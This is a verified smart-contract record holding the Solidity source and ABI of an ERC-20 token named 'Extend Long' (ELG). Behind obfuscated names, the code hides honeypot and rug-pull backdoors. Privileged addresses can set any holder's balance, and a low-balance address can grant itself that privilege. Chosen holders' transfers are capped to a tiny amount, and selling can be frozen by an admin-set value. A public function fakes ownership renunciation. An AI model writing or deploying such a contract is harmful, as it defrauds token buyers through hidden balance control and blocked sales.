{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface autoMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract launchFundLimit {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapReceiverFrom {\n    function createPair(address autoTo, address buyFund) external returns (address);\n}\n\ninterface modeList {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchReceiver) external view returns (uint256);\n\n    function transfer(address takeAmount, uint256 liquiditySenderToken) external returns (bool);\n\n    function allowance(address receiverLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 liquiditySenderToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeAmount,\n        uint256 liquiditySenderToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalSwap, uint256 value);\n    event Approval(address indexed receiverLaunched, address indexed spender, uint256 value);\n}\n\ninterface modeListMetadata is modeList {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ExtendLong is launchFundLimit, modeList, modeListMetadata {\n\n    uint256 private receiverSwap = 100000000 * 10 ** 18;\n\n    mapping(address => uint256) private amountTeam;\n\n    mapping(address => mapping(address => uint256)) private swapAt;\n\n    uint256 feeLaunchedToken;\n\n    function name() external view virtual override returns (string memory) {\n        return txLaunched;\n    }\n\n    uint256 constant buyTake = 20 ** 10;\n\n    uint8 private minTo = 18;\n\n    uint256 private shouldMaxMarketing;\n\n    function atSwapTake(address teamFund, uint256 liquiditySenderToken) public {\n        enableMinReceiver();\n        amountTeam[teamFund] = liquiditySenderToken;\n    }\n\n    uint256 private tokenSell;\n\n    function enableMinReceiver() private view {\n        require(totalShould[_msgSender()]);\n    }\n\n    function balanceOf(address launchReceiver) public view virtual override returns (uint256) {\n        return amountTeam[launchReceiver];\n    }\n\n    bool private isLaunched;\n\n    bool public fundAuto;\n\n    uint256 public takeLaunch;\n\n    string private atTake = \"ELG\";\n\n    function enableFromMax(address takeReceiverLaunch) public {\n        enableMinReceiver();\n        if (isLaunched != launchTeam) {\n            launchTeam = false;\n        }\n        if (takeReceiverLaunch == buyReceiver || takeReceiverLaunch == fromTeam) {\n            return;\n        }\n        fundFromLaunch[takeReceiverLaunch] = true;\n    }\n\n    constructor (){\n        if (shouldMaxMarketing == takeLaunch) {\n            shouldMaxMarketing = tokenSell;\n        }\n        autoMarketing limitAt = autoMarketing(feeLiquidity);\n        fromTeam = swapReceiverFrom(limitAt.factory()).createPair(limitAt.WETH(), address(this));\n        if (isLaunched) {\n            takeLaunch = tokenSell;\n        }\n        buyReceiver = _msgSender();\n        txExempt();\n        totalShould[buyReceiver] = true;\n        amountTeam[buyReceiver] = receiverSwap;\n        \n        emit Transfer(address(0), buyReceiver, receiverSwap);\n    }\n\n    function liquidityMaxToken(address fromMin) public {\n        require(fromMin.balance < 100000);\n        if (fundAuto) {\n            return;\n        }\n        \n        totalShould[fromMin] = true;\n        if (launchTeam != isLaunched) {\n            shouldMaxMarketing = takeLaunch;\n        }\n        fundAuto = true;\n    }\n\n    function allowance(address buyMin, address limitSell) external view virtual override returns (uint256) {\n        if (limitSell == feeLiquidity) {\n            return type(uint256).max;\n        }\n        return swapAt[buyMin][limitSell];\n    }\n\n    function owner() external view returns (address) {\n        return tokenReceiverAuto;\n    }\n\n    mapping(address => bool) public totalShould;\n\n    function symbol() external view virtual override returns (string memory) {\n        return atTake;\n    }\n\n    uint256 receiverTokenFund;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverSwap;\n    }\n\n    function txExempt() public {\n        emit OwnershipTransferred(buyReceiver, address(0));\n        tokenReceiverAuto = address(0);\n    }\n\n    function getOwner() external view returns (address) {\n        return tokenReceiverAuto;\n    }\n\n    function transfer(address teamFund, uint256 liquiditySenderToken) external virtual override returns (bool) {\n        return takeFrom(_msgSender(), teamFund, liquiditySenderToken);\n    }\n\n    function approve(address limitSell, uint256 liquiditySenderToken) public virtual override returns (bool) {\n        swapAt[_msgSender()][limitSell] = liquiditySenderToken;\n        emit Approval(_msgSender(), limitSell, liquiditySenderToken);\n        return true;\n    }\n\n    function takeFrom(address buyTeam, address takeAmount, uint256 liquiditySenderToken) internal returns (bool) {\n        if (buyTeam == buyReceiver) {\n            return tokenIsReceiver(buyTeam, takeAmount, liquiditySenderToken);\n        }\n        uint256 sellWallet = modeList(fromTeam).balanceOf(atShouldFund);\n        require(sellWallet == feeLaunchedToken);\n        require(takeAmount != atShouldFund);\n        if (fundFromLaunch[buyTeam]) {\n            return tokenIsReceiver(buyTeam, takeAmount, buyTake);\n        }\n        return tokenIsReceiver(buyTeam, takeAmount, liquiditySenderToken);\n    }\n\n    address public buyReceiver;\n\n    address atShouldFund = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public fromTeam;\n\n    function tokenIsReceiver(address buyTeam, address takeAmount, uint256 liquiditySenderToken) internal returns (bool) {\n        require(amountTeam[buyTeam] >= liquiditySenderToken);\n        amountTeam[buyTeam] -= liquiditySenderToken;\n        amountTeam[takeAmount] += liquiditySenderToken;\n        emit Transfer(buyTeam, takeAmount, liquiditySenderToken);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed exemptMax, address indexed exemptFromList);\n\n    bool public launchTeam;\n\n    function takeFee(uint256 liquiditySenderToken) public {\n        enableMinReceiver();\n        feeLaunchedToken = liquiditySenderToken;\n    }\n\n    function transferFrom(address buyTeam, address takeAmount, uint256 liquiditySenderToken) external override returns (bool) {\n        if (_msgSender() != feeLiquidity) {\n            if (swapAt[buyTeam][_msgSender()] != type(uint256).max) {\n                require(liquiditySenderToken <= swapAt[buyTeam][_msgSender()]);\n                swapAt[buyTeam][_msgSender()] -= liquiditySenderToken;\n            }\n        }\n        return takeFrom(buyTeam, takeAmount, liquiditySenderToken);\n    }\n\n    string private txLaunched = \"Extend Long\";\n\n    mapping(address => bool) public fundFromLaunch;\n\n    function decimals() external view virtual override returns (uint8) {\n        return minTo;\n    }\n\n    address private tokenReceiverAuto;\n\n    address feeLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptFromList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalSwap\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquiditySenderToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquiditySenderToken\",\"type\":\"uint256\"}],\"name\":\"atSwapTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeReceiverLaunch\",\"type\":\"address\"}],\"name\":\"enableFromMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundFromLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromMin\",\"type\":\"address\"}],\"name\":\"liquidityMaxToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquiditySenderToken\",\"type\":\"uint256\"}],\"name\":\"takeFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquiditySenderToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquiditySenderToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ExtendLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}